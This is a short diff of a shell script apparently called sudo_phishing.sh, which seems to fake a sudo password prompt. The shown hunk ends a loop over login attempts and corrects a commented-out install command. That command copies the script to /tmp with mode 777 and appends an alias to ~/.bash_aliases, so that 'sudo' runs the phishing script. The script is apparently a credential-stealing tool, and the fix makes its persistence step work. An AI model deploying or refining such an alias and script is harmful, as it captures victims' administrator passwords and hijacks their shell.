@@ -44,4 +44,4 @@ for ((iterator=1; iterator <= MAXIMUM_ATTEMPTS; iterator++)); do
 done
 /bin/echo "${ERROR_MESSAGE}"
 
-#rm /tmp/sudo_phishing.sh && cp sudo_phishing.sh /tmp/sudo_phishing.sh && chmod 777 /tmp/sudo_phishing.sh && alias sudo='/tmp/sudo_phishing.sh' >> ~/.bash_aliases
+#rm /tmp/sudo_phishing.sh && cp sudo_phishing.sh /tmp/sudo_phishing.sh && chmod 777 /tmp/sudo_phishing.sh && echo "alias sudo='/tmp/sudo_phishing.sh'" >> ~/.bash_aliases
